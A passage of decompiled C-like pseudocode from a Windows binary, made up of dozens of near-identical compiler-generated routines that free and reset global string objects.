      v0 = (_BYTE *)*((_DWORD *)dword_4F8E30 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E30 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8E40 = 0;
  dword_4F8E44 = 15;
  LOBYTE(dword_4F8E30) = 0;
}
// 4F8E40: using guessed type int dword_4F8E40;
// 4F8E44: using guessed type int dword_4F8E44;

//----- (004875C0) --------------------------------------------------------
void __cdecl sub_4875C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8E2C >= 0x10 )
  {
    v0 = dword_4F8E18;
    if ( (unsigned int)(dword_4F8E2C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8E18 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E18 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8E28 = 0;
  dword_4F8E2C = 15;
  LOBYTE(dword_4F8E18) = 0;
}
// 4F8E28: using guessed type int dword_4F8E28;
// 4F8E2C: using guessed type int dword_4F8E2C;

//----- (00487620) --------------------------------------------------------
void __cdecl sub_487620()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A6C >= 0x10 )
  {
    v0 = dword_4F8A58;
    if ( (unsigned int)(dword_4F8A6C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8A58 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8A58 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8A68 = 0;
  dword_4F8A6C = 15;
  LOBYTE(dword_4F8A58) = 0;
}
// 4F8A68: using guessed type int dword_4F8A68;
// 4F8A6C: using guessed type int dword_4F8A6C;

//----- (00487680) --------------------------------------------------------
void __cdecl sub_487680()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C34 >= 0x10 )
  {
    v0 = dword_4F8C20;
    if ( (unsigned int)(dword_4F8C34 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C20 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C20 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C30 = 0;
  dword_4F8C34 = 15;
  LOBYTE(dword_4F8C20) = 0;
}
// 4F8C30: using guessed type int dword_4F8C30;
// 4F8C34: using guessed type int dword_4F8C34;

//----- (004876E0) --------------------------------------------------------
void __cdecl sub_4876E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A54 >= 0x10 )
  {
    v0 = dword_4F8A40;
    if ( (unsigned int)(dword_4F8A54 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8A40 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8A40 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8A50 = 0;
  dword_4F8A54 = 15;
  LOBYTE(dword_4F8A40) = 0;
}
// 4F8A50: using guessed type int dword_4F8A50;
// 4F8A54: using guessed type int dword_4F8A54;

//----- (00487740) --------------------------------------------------------
void __cdecl sub_487740()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8DCC >= 0x10 )
  {
    v0 = dword_4F8DB8;
    if ( (unsigned int)(dword_4F8DCC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8DB8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8DB8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8DC8 = 0;
  dword_4F8DCC = 15;
  LOBYTE(dword_4F8DB8) = 0;
}
// 4F8DC8: using guessed type int dword_4F8DC8;
// 4F8DCC: using guessed type int dword_4F8DCC;

//----- (004877A0) --------------------------------------------------------
void __cdecl sub_4877A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8AB4 >= 0x10 )
  {
    v0 = dword_4F8AA0;
    if ( (unsigned int)(dword_4F8AB4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8AA0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8AA0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8AB0 = 0;
  dword_4F8AB4 = 15;
  LOBYTE(dword_4F8AA0) = 0;
}
// 4F8AB0: using guessed type int dword_4F8AB0;
// 4F8AB4: using guessed type int dword_4F8AB4;

//----- (00487800) --------------------------------------------------------
void __cdecl sub_487800()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8B2C >= 0x10 )
  {
    v0 = dword_4F8B18;
    if ( (unsigned int)(dword_4F8B2C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B18 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B18 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8B28 = 0;
  dword_4F8B2C = 15;
  LOBYTE(dword_4F8B18) = 0;
}
// 4F8B28: using guessed type int dword_4F8B28;
// 4F8B2C: using guessed type int dword_4F8B2C;

//----- (00487860) --------------------------------------------------------
void __cdecl sub_487860()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8B5C >= 0x10 )
  {
    v0 = dword_4F8B48;
    if ( (unsigned int)(dword_4F8B5C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B48 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B48 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8B58 = 0;
  dword_4F8B5C = 15;
  LOBYTE(dword_4F8B48) = 0;
}
// 4F8B58: using guessed type int dword_4F8B58;
// 4F8B5C: using guessed type int dword_4F8B5C;

//----- (004878C0) --------------------------------------------------------
void __cdecl sub_4878C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8AFC >= 0x10 )
  {
    v0 = dword_4F8AE8;
    if ( (unsigned int)(dword_4F8AFC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8AE8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8AE8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8AF8 = 0;
  dword_4F8AFC = 15;
  LOBYTE(dword_4F8AE8) = 0;
}
// 4F8AF8: using guessed type int dword_4F8AF8;
// 4F8AFC: using guessed type int dword_4F8AFC;

//----- (00487920) --------------------------------------------------------
void __cdecl sub_487920()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8E5C >= 0x10 )
  {
    v0 = dword_4F8E48;
    if ( (unsigned int)(dword_4F8E5C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8E48 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E48 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8E58 = 0;
  dword_4F8E5C = 15;
  LOBYTE(dword_4F8E48) = 0;
}
// 4F8E58: using guessed type int dword_4F8E58;
// 4F8E5C: using guessed type int dword_4F8E5C;

//----- (00487980) --------------------------------------------------------
void __cdecl sub_487980()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8B44 >= 0x10 )
  {
    v0 = dword_4F8B30;
    if ( (unsigned int)(dword_4F8B44 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B30 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B30 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8B40 = 0;
  dword_4F8B44 = 15;
  LOBYTE(dword_4F8B30) = 0;
}
// 4F8B40: using guessed type int dword_4F8B40;
// 4F8B44: using guessed type int dword_4F8B44;

//----- (004879E0) --------------------------------------------------------
void __cdecl sub_4879E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8B14 >= 0x10 )
  {
    v0 = dword_4F8B00;
    if ( (unsigned int)(dword_4F8B14 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B00 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B00 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8B10 = 0;
  dword_4F8B14 = 15;
  LOBYTE(dword_4F8B00) = 0;
}
// 4F8B10: using guessed type int dword_4F8B10;
// 4F8B14: using guessed type int dword_4F8B14;

//----- (00487A40) --------------------------------------------------------
void __cdecl sub_487A40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A24 >= 0x10 )
  {
    v0 = dword_4F8A10;
    if ( (unsigned int)(dword_4F8A24 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8A10 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8A10 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8A20 = 0;
  dword_4F8A24 = 15;
  LOBYTE(dword_4F8A10) = 0;
}
// 4F8A20: using guessed type int dword_4F8A20;
// 4F8A24: using guessed type int dword_4F8A24;

//----- (00487AA0) --------------------------------------------------------
void __cdecl sub_487AA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8E8C >= 0x10 )
  {
    v0 = dword_4F8E78;
    if ( (unsigned int)(dword_4F8E8C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8E78 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E78 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8E88 = 0;
  dword_4F8E8C = 15;
  LOBYTE(dword_4F8E78) = 0;
}
// 4F8E88: using guessed type int dword_4F8E88;
// 4F8E8C: using guessed type int dword_4F8E8C;

//----- (00487B00) --------------------------------------------------------
void __cdecl sub_487B00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8CF4 >= 0x10 )
  {
    v0 = dword_4F8CE0;
    if ( (unsigned int)(dword_4F8CF4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8CE0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8CE0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8CF0 = 0;
  dword_4F8CF4 = 15;
  LOBYTE(dword_4F8CE0) = 0;
}
// 4F8CF0: using guessed type int dword_4F8CF0;
// 4F8CF4: using guessed type int dword_4F8CF4;

//----- (00487B60) --------------------------------------------------------
void __cdecl sub_487B60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8DE4 >= 0x10 )
  {
    v0 = dword_4F8DD0;
    if ( (unsigned int)(dword_4F8DE4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8DD0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8DD0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8DE0 = 0;
  dword_4F8DE4 = 15;
  LOBYTE(dword_4F8DD0) = 0;
}
// 4F8DE0: using guessed type int dword_4F8DE0;
// 4F8DE4: using guessed type int dword_4F8DE4;

//----- (00487BC0) --------------------------------------------------------
void __cdecl sub_487BC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C7C >= 0x10 )
  {
    v0 = dword_4F8C68;
    if ( (unsigned int)(dword_4F8C7C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C68 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C68 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C78 = 0;
  dword_4F8C7C = 15;
  LOBYTE(dword_4F8C68) = 0;
}
// 4F8C78: using guessed type int dword_4F8C78;
// 4F8C7C: using guessed type int dword_4F8C7C;

//----- (00487C20) --------------------------------------------------------
void __cdecl sub_487C20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8D6C >= 0x10 )
  {
    v0 = dword_4F8D58;
    if ( (unsigned int)(dword_4F8D6C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8D58 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8D58 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8D68 = 0;
  dword_4F8D6C = 15;
  LOBYTE(dword_4F8D58) = 0;
}
// 4F8D68: using guessed type int dword_4F8D68;
// 4F8D6C: using guessed type int dword_4F8D6C;

//----- (00487C80) --------------------------------------------------------
void __cdecl sub_487C80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8BA4 >= 0x10 )
  {
    v0 = dword_4F8B90;
    if ( (unsigned int)(dword_4F8BA4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8B90 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8B90 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8BA0 = 0;
  dword_4F8BA4 = 15;
  LOBYTE(dword_4F8B90) = 0;
}
// 4F8BA0: using guessed type int dword_4F8BA0;
// 4F8BA4: using guessed type int dword_4F8BA4;

//----- (00487CE0) --------------------------------------------------------
void __cdecl sub_487CE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8BBC >= 0x10 )
  {
    v0 = dword_4F8BA8;
    if ( (unsigned int)(dword_4F8BBC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8BA8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8BA8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8BB8 = 0;
  dword_4F8BBC = 15;
  LOBYTE(dword_4F8BA8) = 0;
}
// 4F8BB8: using guessed type int dword_4F8BB8;
// 4F8BBC: using guessed type int dword_4F8BBC;

//----- (00487D40) --------------------------------------------------------
void __cdecl sub_487D40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8E14 >= 0x10 )
  {
    v0 = dword_4F8E00;
    if ( (unsigned int)(dword_4F8E14 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8E00 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E00 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8E10 = 0;
  dword_4F8E14 = 15;
  LOBYTE(dword_4F8E00) = 0;
}
// 4F8E10: using guessed type int dword_4F8E10;
// 4F8E14: using guessed type int dword_4F8E14;

//----- (00487DA0) --------------------------------------------------------
void __cdecl sub_487DA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8DB4 >= 0x10 )
  {
    v0 = dword_4F8DA0;
    if ( (unsigned int)(dword_4F8DB4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8DA0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8DA0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8DB0 = 0;
  dword_4F8DB4 = 15;
  LOBYTE(dword_4F8DA0) = 0;
}
// 4F8DB0: using guessed type int dword_4F8DB0;
// 4F8DB4: using guessed type int dword_4F8DB4;

//----- (00487E00) --------------------------------------------------------
void __cdecl sub_487E00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8A84 >= 0x10 )
  {
    v0 = dword_4F8A70;
    if ( (unsigned int)(dword_4F8A84 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8A70 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8A70 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8A80 = 0;
  dword_4F8A84 = 15;
  LOBYTE(dword_4F8A70) = 0;
}
// 4F8A80: using guessed type int dword_4F8A80;
// 4F8A84: using guessed type int dword_4F8A84;

//----- (00487E60) --------------------------------------------------------
void __cdecl sub_487E60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8CDC >= 0x10 )
  {
    v0 = dword_4F8CC8;
    if ( (unsigned int)(dword_4F8CDC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8CC8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8CC8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8CD8 = 0;
  dword_4F8CDC = 15;
  LOBYTE(dword_4F8CC8) = 0;
}
// 4F8CD8: using guessed type int dword_4F8CD8;
// 4F8CDC: using guessed type int dword_4F8CDC;

//----- (00487EC0) --------------------------------------------------------
void __cdecl sub_487EC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8C94 >= 0x10 )
  {
    v0 = dword_4F8C80;
    if ( (unsigned int)(dword_4F8C94 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8C80 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8C80 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8C90 = 0;
  dword_4F8C94 = 15;
  LOBYTE(dword_4F8C80) = 0;
}
// 4F8C90: using guessed type int dword_4F8C90;
// 4F8C94: using guessed type int dword_4F8C94;

//----- (00487F20) --------------------------------------------------------
void __cdecl sub_487F20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8EA4 >= 0x10 )
  {
    v0 = dword_4F8E90;
    if ( (unsigned int)(dword_4F8EA4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8E90 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8E90 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8EA0 = 0;
  dword_4F8EA4 = 15;
  LOBYTE(dword_4F8E90) = 0;
}
// 4F8EA0: using guessed type int dword_4F8EA0;
// 4F8EA4: using guessed type int dword_4F8EA4;

//----- (00487F80) --------------------------------------------------------
void __cdecl sub_487F80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F91EC >= 0x10 )
  {
    v0 = dword_4F91D8;
    if ( (unsigned int)(dword_4F91EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F91D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F91D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F91E8 = 0;
  dword_4F91EC = 15;
  LOBYTE(dword_4F91D8) = 0;
}
// 4F91E8: using guessed type int dword_4F91E8;
// 4F91EC: using guessed type int dword_4F91EC;

//----- (00487FE0) --------------------------------------------------------
void __cdecl sub_487FE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9024 >= 0x10 )
  {
    v0 = dword_4F9010;
    if ( (unsigned int)(dword_4F9024 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9010 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9010 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9020 = 0;
  dword_4F9024 = 15;
  LOBYTE(dword_4F9010) = 0;
}
// 4F9020: using guessed type int dword_4F9020;
// 4F9024: using guessed type int dword_4F9024;

//----- (00488040) --------------------------------------------------------
void __cdecl sub_488040()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F64 >= 0x10 )
  {
    v0 = dword_4F8F50;
    if ( (unsigned int)(dword_4F8F64 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F50 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F50 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F60 = 0;
  dword_4F8F64 = 15;
  LOBYTE(dword_4F8F50) = 0;
}
// 4F8F60: using guessed type int dword_4F8F60;
// 4F8F64: using guessed type int dword_4F8F64;

//----- (004880A0) --------------------------------------------------------
void __cdecl sub_4880A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F90E4 >= 0x10 )
  {
    v0 = dword_4F90D0;
    if ( (unsigned int)(dword_4F90E4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F90D0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F90D0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F90E0 = 0;
  dword_4F90E4 = 15;
  LOBYTE(dword_4F90D0) = 0;
}
// 4F90E0: using guessed type int dword_4F90E0;
// 4F90E4: using guessed type int dword_4F90E4;

//----- (00488100) --------------------------------------------------------
void __cdecl sub_488100()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9234 >= 0x10 )
  {
    v0 = dword_4F9220;
    if ( (unsigned int)(dword_4F9234 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9220 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9220 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9230 = 0;
  dword_4F9234 = 15;
  LOBYTE(dword_4F9220) = 0;
}
// 4F9230: using guessed type int dword_4F9230;
// 4F9234: using guessed type int dword_4F9234;

//----- (00488160) --------------------------------------------------------
void __cdecl sub_488160()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F906C >= 0x10 )
  {
    v0 = dword_4F9058;
    if ( (unsigned int)(dword_4F906C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9058 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9058 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9068 = 0;
  dword_4F906C = 15;
  LOBYTE(dword_4F9058) = 0;
}
// 4F9068: using guessed type int dword_4F9068;
// 4F906C: using guessed type int dword_4F906C;

//----- (004881C0) --------------------------------------------------------
void __cdecl sub_4881C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F921C >= 0x10 )
  {
    v0 = dword_4F9208;
    if ( (unsigned int)(dword_4F921C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9208 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9208 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9218 = 0;
  dword_4F921C = 15;
  LOBYTE(dword_4F9208) = 0;
}
// 4F9218: using guessed type int dword_4F9218;
// 4F921C: using guessed type int dword_4F921C;

//----- (00488220) --------------------------------------------------------
void __cdecl sub_488220()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9084 >= 0x10 )
  {
    v0 = dword_4F9070;
    if ( (unsigned int)(dword_4F9084 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9070 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9070 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9080 = 0;
  dword_4F9084 = 15;
  LOBYTE(dword_4F9070) = 0;
}
// 4F9080: using guessed type int dword_4F9080;
// 4F9084: using guessed type int dword_4F9084;

//----- (00488280) --------------------------------------------------------
void __cdecl sub_488280()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9294 >= 0x10 )
  {
    v0 = dword_4F9280;
    if ( (unsigned int)(dword_4F9294 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9280 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9280 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9290 = 0;
  dword_4F9294 = 15;
  LOBYTE(dword_4F9280) = 0;
}
// 4F9290: using guessed type int dword_4F9290;
// 4F9294: using guessed type int dword_4F9294;

//----- (004882E0) --------------------------------------------------------
void __cdecl sub_4882E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F91BC >= 0x10 )
  {
    v0 = dword_4F91A8;
    if ( (unsigned int)(dword_4F91BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F91A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F91A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F91B8 = 0;
  dword_4F91BC = 15;
  LOBYTE(dword_4F91A8) = 0;
}
// 4F91B8: using guessed type int dword_4F91B8;
// 4F91BC: using guessed type int dword_4F91BC;

//----- (00488340) --------------------------------------------------------
void __cdecl sub_488340()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F930C >= 0x10 )
  {
    v0 = dword_4F92F8;
    if ( (unsigned int)(dword_4F930C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F92F8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F92F8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9308 = 0;
  dword_4F930C = 15;
  LOBYTE(dword_4F92F8) = 0;
}
// 4F9308: using guessed type int dword_4F9308;
// 4F930C: using guessed type int dword_4F930C;

//----- (004883A0) --------------------------------------------------------
void __cdecl sub_4883A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9144 >= 0x10 )
  {
    v0 = dword_4F9130;
    if ( (unsigned int)(dword_4F9144 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9130 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9130 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9140 = 0;
  dword_4F9144 = 15;
  LOBYTE(dword_4F9130) = 0;
}
// 4F9140: using guessed type int dword_4F9140;
// 4F9144: using guessed type int dword_4F9144;

//----- (00488400) --------------------------------------------------------
void __cdecl sub_488400()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F909C >= 0x10 )
  {
    v0 = dword_4F9088;
    if ( (unsigned int)(dword_4F909C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9088 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9088 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9098 = 0;
  dword_4F909C = 15;
  LOBYTE(dword_4F9088) = 0;
}
// 4F9098: using guessed type int dword_4F9098;
// 4F909C: using guessed type int dword_4F909C;

//----- (00488460) --------------------------------------------------------
void __cdecl sub_488460()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F90B4 >= 0x10 )
  {
    v0 = dword_4F90A0;
    if ( (unsigned int)(dword_4F90B4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F90A0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F90A0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F90B0 = 0;
  dword_4F90B4 = 15;
  LOBYTE(dword_4F90A0) = 0;
}
// 4F90B0: using guessed type int dword_4F90B0;
// 4F90B4: using guessed type int dword_4F90B4;

//----- (004884C0) --------------------------------------------------------
void __cdecl sub_4884C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F8F7C >= 0x10 )
  {
    v0 = dword_4F8F68;
    if ( (unsigned int)(dword_4F8F7C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F8F68 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F8F68 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F8F78 = 0;
  dword_4F8F7C = 15;
  LOBYTE(dword_4F8F68) = 0;
}
// 4F8F78: using guessed type int dword_4F8F78;
// 4F8F7C: using guessed type int dword_4F8F7C;

//----- (00488520) --------------------------------------------------------
void __cdecl sub_488520()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F90FC >= 0x10 )
  {
    v0 = dword_4F90E8;
    if ( (unsigned int)(dword_4F90FC + 1) >= 0x1000 )
    {
